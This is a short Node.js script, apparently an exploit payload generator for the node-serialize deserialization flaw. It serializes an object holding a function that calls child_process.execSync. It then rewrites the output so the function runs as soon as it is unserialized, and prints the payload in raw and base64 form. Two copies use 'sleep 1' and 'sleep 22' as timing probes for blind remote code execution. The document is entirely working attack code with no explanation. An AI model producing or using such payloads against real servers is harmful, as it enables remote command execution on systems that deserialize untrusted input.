var y = {
    rce : function(){
        require('child_process').execSync('sleep 1');
    },
}

var serialize = require('node-serialize');
var serialized = serialize.serialize(y);
serialized = serialized.replace('}"}', '}()"}');

console.log(serialized);
console.log(Buffer.from(serialized).toString('base64'));



var y = {
    rce : function(){
        require('child_process').execSync('sleep 22');
    },
}

var serialize = require('node-serialize');
var serialized = serialize.serialize(y);
serialized = serialized.replace('}"}', '}()"}');

console.log(serialized);
console.log(Buffer.from(serialized).toString('base64'));
